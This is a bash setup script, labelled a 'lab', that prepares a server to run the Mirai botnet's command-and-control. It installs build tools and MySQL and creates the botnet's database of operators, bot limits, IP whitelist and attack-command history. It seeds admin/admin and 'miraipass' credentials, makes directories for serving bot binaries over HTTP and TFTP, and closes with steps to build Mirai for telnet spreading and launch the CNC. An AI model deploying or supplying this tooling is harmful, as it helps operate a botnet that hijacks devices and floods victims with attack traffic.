#!/bin/bash

if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi

echo "========================================="
echo "  Mirai Lab Setup - x86-32 Only"
echo "========================================="
echo ""

# Install required packages
echo "[1/4] Installing required packages..."
apt-get update
apt-get install -y mysql-server mysql-client gcc-multilib golang-go build-essential

# Start MySQL
echo ""
echo "[2/4] Starting MySQL..."
systemctl start mysql
systemctl enable mysql

# Create database
echo ""
echo "[3/4] Creating database..."
mysql -u root << EOF
CREATE DATABASE IF NOT EXISTS mirai;
USE mirai;

CREATE TABLE IF NOT EXISTS users (
  id int(10) unsigned NOT NULL AUTO_INCREMENT,
  username varchar(32) NOT NULL,
  password varchar(32) NOT NULL,
  max_bots int(11) DEFAULT -1,
  admin int(11) DEFAULT 0,
  duration_limit int(11) DEFAULT 0,
  cooldown int(11) DEFAULT 0,
  last_paid int(11) DEFAULT 0,
  wrc int(11) DEFAULT 0,
  intvl int(11) DEFAULT 30,
  api_key varchar(64) DEFAULT NULL,
  PRIMARY KEY (id),
  UNIQUE KEY username (username)
);

CREATE TABLE IF NOT EXISTS whitelist (
  id int(10) unsigned NOT NULL AUTO_INCREMENT,
  prefix varchar(32) NOT NULL,
  netmask tinyint(3) unsigned NOT NULL,
  PRIMARY KEY (id)
);

CREATE TABLE IF NOT EXISTS history (
  id int(10) unsigned NOT NULL AUTO_INCREMENT,
  user_id int(11) NOT NULL,
  time_sent int(11) NOT NULL,
  duration int(11) NOT NULL,
  command varchar(512) NOT NULL,
  max_bots int(11) NOT NULL,
  PRIMARY KEY (id)
);

GRANT ALL PRIVILEGES ON mirai.* TO 'mirai'@'localhost' IDENTIFIED BY 'miraipass';
FLUSH PRIVILEGES;

INSERT INTO users (username, password, admin, max_bots, duration_limit, cooldown) 
VALUES ('admin', 'admin', 1, -1, 3600, 0);
EOF

if [ $? -eq 0 ]; then
    echo "  [OK] Database created"
else
    echo "  [FAIL] Database creation failed"
    exit 1
fi

# Create directories
echo ""
echo "[4/4] Creating directories..."
mkdir -p /var/www/html/bins
mkdir -p /var/tftp

echo ""
echo "========================================="
echo "  Setup Complete!"
echo "========================================="
echo ""
echo "Database credentials:"
echo "  Database: mirai"
echo "  User:     mirai"
echo "  Password: miraipass"
echo "  Admin:    admin / admin"
echo ""
echo "Next steps:"
echo "  1. cd ~/mirai-source/mirai"
echo "  2. ./build.sh release telnet"
echo "  3. cd cnc && ./cnc"
echo ""